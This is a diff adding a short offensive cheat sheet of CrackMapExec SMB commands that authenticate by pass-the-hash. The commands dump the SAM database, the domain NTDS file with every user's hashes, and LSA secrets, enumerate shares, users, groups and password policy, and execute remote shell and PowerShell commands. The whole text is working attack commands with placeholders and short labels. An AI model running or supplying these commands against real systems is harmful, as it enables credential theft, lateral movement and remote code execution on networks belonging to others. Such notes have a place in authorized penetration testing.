@@ -1,0 +1,24 @@
+We can use this to try the local authentication
+--local-auth
+Retrieve the sam of the system
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" --sam
+
+Retrieve the ntds file of a domain (all user's hashes)
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" --ntds
+
+Retreive the lsa credentials of the computer
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" --lsa
+
+Multiple enumeration
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" --shares
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" --disks
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" --loggedon-users
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" --users [USER]
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" --groups [GROUP]
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" --local-groups [GROUP]
+Enumerate password policy
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" --pass-pol 
+
+Execute remote command
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" -x COMMAND
+cme smb {HOST}/{CIDR} -u {USER} -H "0:{NTHASH}" -X PS_COMMAND
